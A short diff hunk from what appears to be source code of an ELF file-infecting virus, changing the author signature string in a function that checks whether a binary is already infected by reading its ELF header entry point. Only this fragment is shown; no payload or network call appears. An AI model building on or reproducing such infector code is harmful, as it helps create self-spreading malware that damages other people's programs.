@@ -195,7 +195,7 @@ void update_tables(unsigned char *b, size_t len, struct s_infect_params p) {
 //=============================================================
 
 int check_already_packed(char *s, size_t n, size_t virus_len, size_t dataearly_off){
-	char sig[] = "SuperVirus version 1.3 (c)oded by ndombre-agadhgad-AAAAAAAA";
+	char sig[] = "virus.custom version 1.3 (c)oded dec-2018 by ndombre-agadhgad - AAAAAAAA";
 	size_t sig_len = slen(sig);
 	Elf64_Ehdr *h = (void*)s;
 	size_t entry = elf_addr_to_offset(s,n,h->e_entry);
